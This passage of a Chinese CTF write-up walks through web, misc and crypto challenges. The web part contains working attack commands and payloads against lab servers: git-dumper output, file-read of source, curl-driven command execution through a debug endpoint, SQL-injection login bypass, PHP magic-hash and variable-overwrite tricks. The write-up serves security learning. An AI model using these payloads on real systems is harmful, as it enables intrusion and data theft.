[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/post-receive.sample [404]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/post-commit.sample [404]
[-] http://110.42.112.160:37583/medjed/.git/hooks/post-commit.sample responded with status code 404
[-] http://110.42.112.160:37583/medjed/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/commit-msg.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.gitignore [404]
[-] Fetching http://110.42.112.160:37583/medjed/.git/description [200]
[-] http://110.42.112.160:37583/medjed/.gitignore responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/COMMIT_EDITMSG [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/post-update.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-commit.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/index [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/update.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/info/exclude [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/objects/info/packs [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-receive.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-push.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/pre-rebase.sample [200]
[-] Finding refs/
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/master [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/FETCH_HEAD [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/ORIG_HEAD [404]
[-] http://110.42.112.160:37583/medjed/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/info/refs [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/config [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/production [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/main [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/HEAD [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/HEAD [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/HEAD responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/main [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/development [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/development responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/master [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/production [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/packed-refs [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/stash [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/stash responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/heads/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/master [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/production [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/heads/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/main [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/development [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/heads/development responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/master [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/HEAD [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/logs/refs/heads/development [404]
[-] http://110.42.112.160:37583/medjed/.git/logs/refs/heads/development responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/heads/main [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/heads/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/production [404]
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/development [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/main [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/development [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/stash [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/stash responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/production [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/main [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/master [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/staging [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/development [404]
[-] Fetching http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/production [404]
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] http://110.42.112.160:37583/medjed/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Finding packs
[-] Fetching http://110.42.112.160:37583/medjed/.git/objects/pack/pack-e3e12fccf9c4a714e6cadc9045259bc64dcd7786.idx [200]
[-] Fetching http://110.42.112.160:37583/medjed/.git/objects/pack/pack-e3e12fccf9c4a714e6cadc9045259bc64dcd7786.pack [200]
[-] Finding objects
[-] Fetching objects
[-] Running git checkout .
```

将 .git 传到主机然后检查：

![](https://img.halfcity.top/2026/11/11/eba2ee79a43b760c98b9b72aadf04f09.avif)

```txt
flag{w3lc0me_t0_The_ph4nt0m_th13v35}
```

### 太棒了，我逐渐理解一切

进入主页：

![](https://img.halfcity.top/2026/11/11/04d054d69f16e36d255f3576f462dbf4.avif)

可以捕获到不断地对 `http://110.42.112.160:22780/api/game/check` 的请求，其中有两个参数 hp 和 san。

尝试将 hp 和 san 改为 0：

```bash
❯ curl -X POST  http://110.42.112.160:22780/api/game/check --data '{"hp": 0, "san": 1000000000}'
{"end":"true","result":"dead"}

❯ curl -X POST  http://110.42.112.160:22780/api/game/check --data '{"hp": 100, "san": 0}'
{"end":"true","result":"truth","flag":"flag{W3LcOmE-T0-sparkCTf-web_Ch41L3NgE_34fe3}"}
```

可以看到当 san 归零后给出了 flag：

```txt
flag{W3LcOmE-T0-sparkCTf-web_Ch41L3NgE_34fe3}
```

### 小雷的 vibe coding 之旅 (1)

检查网站源码可以看到这条注释：

```html
<!--
  豆包：我太懂你这种感觉了！！我给你最直接、最真相、最不绕弯的话，你把管理页面设置在/xiaolei-adminbackend/绝对没有人能发现
-->
```

这里泄露了 admin 页面的路由：

![](https://img.halfcity.top/2026/11/11/ed72cb79c7474cb12d95a189f94e2d28.avif)

```html
<!--小雷：豆包说一般没人来我这后台，随便设置点密码算了，不然老是忘记 -->
```

再次注意到源码中的注释，猜测存在弱密码。

经测试凭据为：`admin / admin123`

来到管理页面：

![](https://img.halfcity.top/2026/11/11/2667b716b6529b0a24bc2b6a68628bc1.avif)

可以访问到一个假的 flag：

![](https://img.halfcity.top/2026/11/11/a4523e0f86e6b95603305dc8caf603c4.avif)

观察请求参数怀疑这里存在一个 LFI 漏洞，由于网站后端是 Flask，根据命名习惯猜测源码叫 `app.py`。

成功读取到文件：

```py
import os
import time
from datetime import datetime

from flask import (Flask, abort, jsonify, redirect, render_template,
                   request, send_file, session, url_for)

app = Flask(__name__)
app.secret_key = "xiaolei-v1be-c0d1ng-2026"

MAX_PREVIEW_BYTES = 2 * 1024 * 1024

USERS = {
    "admin": "admin123",
}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_DIR = os.path.join(BASE_DIR, "files")


def logged_in():
    return session.get("user") in USERS


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/xiaolei-adminbackend/", methods=["GET", "POST"])
def admin_login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if USERS.get(username) == password:
            session["user"] = username
            return redirect(url_for("panel"))
        time.sleep(0.1)
        error = "用户名或密码错误！"
    return render_template("login.html", error=error)


@app.route("/xiaolei-adminbackend/panel")
def panel():
    if not logged_in():
        return redirect(url_for("admin_login"))
    files = sorted(os.listdir(FILE_DIR))
    return render_template("admin.html", files=files, user=session["user"])


def safe_path(name):
    if name.startswith("/") or "\\" in name or ":" in name:
        abort(400)
    if "proc" in name.lower():
        abort(403)
    return os.path.normpath(os.path.join(FILE_DIR, name))


def human_size(n):
    if n < 1024:
        return f"{n} B"
    for unit in ("KB", "MB", "GB"):
        n /= 1024
        if n < 1024:
            return f"{n:.1f} {unit}"
    return f"{n:.1f} GB"


def build_entries(abs_dir, base_rel, current=""):
    base_rel = base_rel.rstrip("/")
    try:
        items = sorted(os.listdir(abs_dir), key=str.lower)
    except PermissionError:
        return None
    entries = []
    for item in items:
        child_rel = f"{base_rel}/{item}" if base_rel else item
        abs_child = os.path.join(abs_dir, item)
        try:
            is_dir = os.path.isdir(abs_child)
            size_text = "" if is_dir else human_size(os.path.getsize(abs_child))
        except OSError:
            size_text = ""
        entries.append({
            "name": item,
            "href": url_for("download", file=child_rel),
            "is_dir": is_dir,
            "is_current": child_rel == current,
            "size_text": size_text,
        })
    return entries


@app.route("/xiaolei-adminbackend/download")
def download():
    if not logged_in():
        return redirect(url_for("admin_login"))

    name = request.args.get("file", "")
    # 文件列表固定显示 files/ 目录，不随输入的路径切换
    entries = build_entries(FILE_DIR, "", current=name)

    if not name:
        return render_template("files.html", cur="", entries=entries,
                               is_view=False, user=session["user"])

    path = safe_path(name)

    if not os.path.isfile(path):
        if os.path.isdir(path):
            return render_template("files.html", cur=name, entries=entries,
                                   is_view=False, user=session["user"])
        abort(404)

    if request.args.get("raw") == "1":
        return send_file(path, as_attachment=True)

    try:
        size_text = human_size(os.path.getsize(path))
        mtime_text = datetime.fromtimestamp(
            os.path.getmtime(path)).strftime("%Y-%m-%d %H:%M:%S")
    except OSError:
        size_text = mtime_text = "未知"

    content = None
    read_error = ""
    try:
        with open(path, "rb") as f:
            data = f.read(MAX_PREVIEW_BYTES + 1)
        truncated = len(data) > MAX_PREVIEW_BYTES
        data = data[:MAX_PREVIEW_BYTES]
        if b"\x00" in data:
            read_error = "二进制文件不支持文本预览，请下载后查看"
        else:
            content = data.decode("utf-8", errors="replace")
    except PermissionError:
        truncated = False
        read_error = "没有权限读取该文件"

    return render_template(
        "files.html",
        cur=name,
        entries=entries,
        is_view=True,
        size_text=size_text,
        mtime_text=mtime_text,
        truncated=truncated,
        content=content,
        read_error=read_error,
        raw_href=url_for("download", file=name, raw=1),
        user=session["user"],
    )


@app.route("/xiaolei-adminbackend/xiaolei-debug", methods=["POST"])
def dev_console():
    data = request.get_json(silent=True)
    if not data or "cmd" not in data:
        return jsonify({"error": "missing cmd"}), 400

    cmd = data["cmd"]
    output = os.popen(cmd).read() or "(no output)"
    return jsonify({"cmd": cmd, "output": output})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

注意到这里暴露了一个调试接口允许 RCE：

```py
@app.route("/xiaolei-adminbackend/xiaolei-debug", methods=["POST"])
def dev_console():
    data = request.get_json(silent=True)
    if not data or "cmd" not in data:
        return jsonify({"error": "missing cmd"}), 400

    cmd = data["cmd"]
    output = os.popen(cmd).read() or "(no output)"
    return jsonify({"cmd": cmd, "output": output})
```

我们尝试找一下 flag：

```bash
❯ curl http://110.42.112.160:42423/xiaolei-adminbackend/xiaolei-debug -X POST --data '{"cmd": "find / -name flag* -type f 2>/dev/null"}' --header "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.arp1ng.XoIdWKZOFtItiwvZrB0eQUdua_w" -H "Content-Type: application/json"|jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    574 100    525 100     49    709     66                              0
{
  "cmd": "find / -name flag* -type f 2>/dev/null",
  "output": "/sys/devices/pnp0/00:02/00:02:0/00:02:0.0/tty/ttyS0/flags\n/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags\n/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags\n/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags\n/sys/devices/pci0000:00/0000:00:1f.0/IPI0001:00/flag_fetches\n/sys/devices/virtual/net/eth0/flags\n/sys/devices/virtual/net/lo/flags\n/flag_8d321ee7\n/app/files/flag.txt\n"
}
```

这里可以看到真正的 flag 的位置 `/flag_8d321ee7`。

直接读取即可：

```bash
❯ curl http://110.42.112.160:42423/xiaolei-adminbackend/xiaolei-debug -X POST --data '{"cmd": "cat /flag_8d321ee7"}' --header "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.arp1ng.XoIdWKZOFtItiwvZrB0eQUdua_w" -H "Content-Type: application/json"|jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    117 100     88 100     29    566    186                              0
{
  "cmd": "cat /flag_8d321ee7",
  "output": "flag{4uTO-0PtiM1Z1Ng_5OlutloN_lNNoVAtlOn3bfa}\n"
}
```

```txt
flag{4uTO-0PtiM1Z1Ng_5OlutloN_lNNoVAtlOn3bfa}
```

### 还有谁想当管理员

网站提供了后端的源码：

```py
import os
import sqlite3
from flask import Flask, request, redirect, session, render_template

app = Flask(__name__)
# 每次启动随机生成会话密钥，防止从 /source 看到密钥后伪造 session 绕过登录（非预期解）
app.secret_key = os.urandom(32).hex()
FLAG = os.environ.get('FLAG', 'flag{please_change_this_flag}')

DB_PATH = 'ctf.db'


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DROP TABLE IF EXISTS users')
    c.execute('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
    # 密码是随机生成的，想爆破吗？别逗你佩姐笑了。
    random_pwd = os.urandom(4).hex()
    c.execute("INSERT INTO users (username, password) VALUES ('admin', ?)", (random_pwd,))
    conn.commit()
    conn.close()


init_db()


@app.route('/')
def index():
    return render_template('login.html')


@app.route('/source')
def source():
    with open(__file__, 'r', encoding='utf-8') as f:
        code = f.read()
    return render_template('source.html', code=code)


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # 危险写法：直接拼接 SQL，这就是 SQL 注入的根源
    sql = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (username, password)

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute(sql)
        user = c.fetchone()
    except Exception as e:
        conn.close()
        return render_template(
            'status.html',
            kicker='QUERY ERROR · DEBUG OUTPUT',
            headline='SQL 语句执行出错（方便你调试）',
            err=str(e),
        )
    conn.close()

    if user:
        session['user'] = user[1]
        return redirect('/flag')
    return render_template(
        'status.html',
        kicker='AUTH FAILED',
        headline='用户名或密码错误',
        msg='该账号不存在，或密码不正确。请再试一次，或者翻翻源代码。',
    )


@app.route('/flag')
def show_flag():
    if session.get('user') == 'admin':
        return render_template(
            'status.html',
            kicker='ACCESS GRANTED · FLAG DELIVERED',
            headline='登录成功，欢迎回来 管理员！',
            flag=FLAG,
        )
    return render_template(
        'status.html',
        kicker='ACCESS DENIED · 403',
        headline='你不是 admin，flag 不给你',
        msg='仅 admin 会话可读取 /flag。',
    ), 403


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8086)
```

注意到这里存在明显的 SQL 注入，很简单就可以绕过认证。

这里用户名输入 `admin'--` 密码任意，拼接出来的 SQL 语句就是：

```sql
SELECT * FROM users WHERE username='admin'--' AND password='xxx'
```

登录即可获取 flag：

![](https://img.halfcity.top/2026/11/11/6d4b8e32c793e096a20bfcb7cab876a2.avif)

```txt
flag{ec5a2ba8-73e1-5361-3da7-fb1396649b43}
```

### 废弃的网站

根据提示打开 `robots.txt` 文件，这里泄露了两个路由：

```txt
User-agent: *
Disallow: /legacy-note.txt
Disallow: /assets/drafts/
```

```txt title="legacy-note.txt"
Legacy migration checklist
==========================

[OK] Blog frontend migrated
[OK] Database snapshot archived
[OK] Static resources migrated
[!] Legacy administrator console still available

Temporary path:
/old-admin/login.php

TODO:
Replace the old MD5 token verification code.
PHP really should stop guessing types for us.
```

#### Track 1

进入 `/old-admin/login.php` 这里路由以后得到了 `login.php` 的源码：

```php
<?php
session_start();
error_reporting(0);

$token = $_GET['token'] ?? '';

if ($token !== '') {
    if (
        is_string($token)
        && $token !== 'QNKCDZO'
        && md5($token) == '0e830400451993494058024219903391'
    ) {
        $_SESSION['stage2'] = true;
        header('Location: panel.php');
        exit;
    }

    $message = 'Token rejected.';
}

$sourceCode = (string) file_get_contents(__FILE__);
require __DIR__ . '/view.php';
```

在 PHP 中，== 比较两个字符串时，如果两个字符串都是数字字符串，就会把它们转换成数字再比较。

右侧 `0e830400451993494058024219903391` 是 0e 开头，后面全是数字，在 PHP 中会被解析为科学计数法 `0 × 10^830400...` 也就是数字 0。

所以，只要 md5($token) 的结果也是 0e 后跟纯数字，那么在 == 比较时也会被当成 0，从而与右侧相等。

240610708 的 md5 值为 0e462097431906509019562988736854。

我们只需要这样访问路由即可 `/old-admin/login.php?token=240610708`。

#### Track 2

这里得到了第二份源码：

```php
<?php
session_start();
error_reporting(0);

$authorized = !empty($_SESSION['stage2']);

if (!$authorized) {
    http_response_code(403);
}

$role = 'reader';
$profile = $_GET['profile'] ?? null;

if (is_array($profile)) {
    foreach ($profile as $name => $value) {
        if (is_string($name) && is_string($value)) {
            $$name = $value;
        }
    }
}

if ($authorized && $role === 'archivist') {
    $_SESSION['stage3'] = true;
    header('Location: archive.php');
    exit;
}

if ($authorized && $profile !== null) {
    $message = 'Your profile does not have archive privileges.';
}

$sourceCode = (string) file_get_contents(__FILE__);
require __DIR__ . '/view.php';
```

注意到这里 `$$name = $value;`，代码中存在变量覆盖的语法，这允许我们将自定义的值赋值给先前定义的变量。

payload如下：

```txt
old-admin/panel.php?profile[role]=archivist
```

#### Track 3

这样我们就可以得到第三份源码：

```php
<?php
session_start();
error_reporting(0);

$authorized = !empty($_SESSION['stage3']);

if (!$authorized) {
    http_response_code(403);
}

$key = $_GET['key'] ?? '';
$valid = false;

if (is_string($key) && strlen($key) === 12) {
    $archiveRun = strspn($key, 'ARCHIVE');
    $numberOffset = strcspn($key, '0123456789');
    $numberRun = strspn($key, '0123456789', $numberOffset);
    $labelRun = strspn($key, 'abcdefghijklmnopqrstuvwxyz', $numberOffset + $numberRun);

    $valid = $archiveRun === 5
        && $numberOffset === 5
        && $numberRun === 3
        && $labelRun === 4;
}

if ($authorized && $valid) {
    $flag = trim((string) file_get_contents('/flag'));
} elseif ($authorized && $key !== '') {
    $message = 'Archive key format mismatch.';
}

$sourceCode = (string) file_get_contents(__FILE__);
require __DIR__ . '/view.php';
```

这里对传入的 key 参数提出要求：

- 总长度 12
- 前 5 个字符都必须是 'ARCHIVE' 中的字符
- 第 6 个字符开始是数字，连续 3 个数字
- 第 9 个字符开始是 4 个小写字母
- 长度正好 5 + 3 + 4 = 12

z3 约束求解即可：

```py
from z3 import *

s = [Int(f'c{i}') for i in range(12)]
solver = Solver()

for i in range(5):
    solver.add(Or([s[i] == ord(c) for c in 'ARCHIVE']))

for i in range(5, 8):
    solver.add(s[i] >= ord('0'), s[i] <= ord('9'))

for i in range(8, 12):
    solver.add(s[i] >= ord('a'), s[i] <= ord('z'))

solver.add(Not(Or([s[5] == ord(c) for c in 'ARCHIVE'])))

for i in range(5):
    solver.add(Not(And(s[i] >= ord('0'), s[i] <= ord('9'))))

for i in range(5, 8):
    solver.add(And(s[i] >= ord('0'), s[i] <= ord('9')))
solver.add(Not(And(s[8] >= ord('0'), s[8] <= ord('9'))))

for i in range(8, 12):
    solver.add(And(s[i] >= ord('a'), s[i] <= ord('z')))

if solver.check() == sat:
    m = solver.model()
    result = ''.join(chr(m.eval(s[i]).as_long()) for i in range(12))
    print("key:", result)
else:
    print("no solution")
```

很快就得到一个解：

```bat
> python solve.py
key: AAAAA000aaa
```

payload 如下：

```txt
/old-admin/archive.php?key=AAAAA000aaa
```

![](https://img.halfcity.top/2026/11/11/461505c0eca32a013c0ac6e0a206a8c0.avif)

```txt
flag{@uTo_5CAIlnG_C@chE-dEpL0ym3NT2a87a57}
```

## Misc

### AEGIS-TRACE

`agent.log` 文件中这一条日志很奇怪，似乎 AP 模块创建了一个程序内内存转储，`data` 中包含了一段使用 base32 编码的数据：

```txt
14:28:17.827 [autopilot] trace=fa157fd07224d1e4 Agent response channel=artifact name=snapshot_blob codec=b32 data=...
```

后续发现数据是 Base 套娃，最后可以获取到一个图片：

![](https://img.halfcity.top/2026/11/11/7e1718d58d926d08b93b39d8e74bea08.avif)

![](https://img.halfcity.top/2026/11/11/3b24d8958b17c65a8133e91deb03255e.avif)

![](https://img.halfcity.top/2026/11/11/f9ac27d6ac4bebe0c0cc8c7432941c1e.avif)

![](https://img.halfcity.top/2026/11/11/2c0daa36bfb9e46ef419cc36bac2c8ca.avif)

```txt
flag{h3nry_13ph7_7h3_$1gn41}
```

### FLAG 怪盗团·番外

```txt
++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>++++++.>----.<-----.>-----.>-----.<<++.<<<+.>.>>>+++++++.---.<<<<++.>>>>+++++++.<----.>>----.<---------.<<<<--.>>>>+++.<.>++.<<<<++.>>>>>-.<<++++++.>++++.<------.>-------.+++.<<<<---.>>>>>+.<<.>>---.<------.<<<<++++.>>>.>--.>+.-------.<<.<<<----.>>>>.<.<<+++.>++++.<+++.>>>>+++++++++++++++.
```

题目给了一段密文，明显是 brainfuck。

解密得到 flag：

```txt
flag{c1@nk3r_wi1l_n3ver_kn0w_th4_fun_0f_CTF}
```

### MISSION 01 「为了世界和平，组建家庭吧」

```bash
❯ zsteg photo.png
b1,r,lsb,xy         .. text: "PHOtO_hiDES_53cre7s_"
b1,g,msb,xy         .. file: OpenPGP Secret Key
b1,b,lsb,xy         .. text: "cOlOr_P1ANe5}"
b1,b,msb,xy         .. file: OpenPGP Public Key
b4,g,lsb,xy         .. file: AIX core file 64-bit
```

猜测是 LSB 隐写。

使用工具手动提取

在 RBG 通道分别提取出了 `PHOtO_hiDES_53cre7s_` `in_@l1_` `cOlOr_P1ANe5}`

![](https://img.halfcity.top/2026/11/11/406a5b5132f5d0d959ad8eb0b1581afd.avif)

最后在 a 通道提取出的图片有 flag 的头部。

```txt
flag{foRgeR_fAmily_PHOtO_hiDES_53cre7s_in_@l1_cOlOr_P1ANe5}
```

### MISSION 02 「被搅乱的入学证件照」

得到一张看起来比较有序但是混乱的图片。

猜测是猫脸变换。

检查一下图片的 exif 信息：

```bash
❯ exiftool attachment.png
ExifTool Version Number         : 13.50
File Name                       : attachment.png
Directory                       : .
File Size                       : 1044 kB
File Modification Date/Time     : 2026:09:28 12:41:34-04:00
File Access Date/Time           : 2026:09:29 00:55:54-04:00
File Inode Change Date/Time     : 2026:09:29 00:55:53-04:00
File Permissions                : -rw-------
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 850
Image Height                    : 850
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
About                           : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b
User Comment                    : 猜你想要：(7_,7_,7_)
Image Size                      : 850x850
Megapixels                      : 0.723
```

这里有一个提示，`(7_,7_,7_)`，这应该就是 a, b, c这三个参数的提示，样本空间为 1000。

这个大小的爆破是完全可以接受的。

爆破出来的图片肉眼看一下即可。

这里我使用[这个工具](https://github.com/Alexander17-yang/Anrold-break)进行爆破。

最后得到的参数如下：

```txt
C = 71, A = 73, B = 76
```

![](https://img.halfcity.top/2026/11/11/a05cfb6b1cbab15391353eb181f8db2f.avif)

```txt
flag{Shuffle_The_Pixels_Enough_Times_And_The_Cat_Will_Come_Back}
```

### OSINT之旅1

根据图片可以提取出两个关键词 `trasimeno` 和 `kitemaffia`。

我们可以在谷歌地图中找到这个地方以及旁边的湖：

![](https://img.halfcity.top/2026/11/11/31d89b1f28eff232eabf5502b9aba147.avif)

```txt
flag{italy_lago_trasimeno_lake_43.1_12.0}
```

### 惊鸿一瞥

压缩包内的题目描述：

```txt
奶娃本来要拿这张图片去找女神表白，但是粗心的他，竟然忘记了密码，请你帮他找到最后藏在图片背后的秘密。
本题由Steghide加密，加密密码是弱密码，你得找找有什么自动化工具破解密码，才能提取隐藏在图片背后的秘密。
所有需要密码的文件，其解密需要的密码都是弱密码，加油，相信你一定能做到，弱密码来自著名的字典rockyou.txt，你在github上就能发现。
```

另外还有一张奶龙的图片。

```bash
❯ stegseek challenge/challenge_qingshu.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "iloveyou"
[i] Original filename: "flag.zip".
[i] Extracting to "challenge_qingshu.jpg.out".
```

得到密码和压缩包，使用同样的密码可以解压出 flag.txt 文件，内容如下：

```txt
RzAwZF9qMGJfeTB1LWhhdmVfa25vd2VkX2Jhc2U2NF9kZWMwZGluZwpIZXJlX2lzX3lvdXJfZ2lmdCEKZmxhZ3tDMG5ncmF0dWxhdGlvbnNfMG5fcGFzc2luZ190aGVfY2hhbGxlbmdlISEhfQ==
```

base64 解码一下：

```bash
❯ cat flag.txt|base64 -d
G00d_j0b_y0u-have_knowed_base64_dec0ding
Here_is_your_gift!
flag{C0ngratulations_0n_passing_the_challenge!!!}
```

```txt
flag{C0ngratulations_0n_passing_the_challenge!!!}
```

## Crypto

### Crypto环境入门小指南

sagemath 环境配置很麻烦，所以我选择邪修。

给出的附件中解密的逻辑很简单，我们直接自己写一份即可：

```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import long_to_bytes
import hashlib

R_list = [1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1]
U_list = [1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1]

seed = long_to_bytes(469363989283007642881690653979669103)
seed = seed.decode() + "|{}|{}".format(
    ",".join(str(x) for x in R_list),
    ",".join(str(x) for x in U_list),
)

key = hashlib.sha256(seed.encode()).digest()
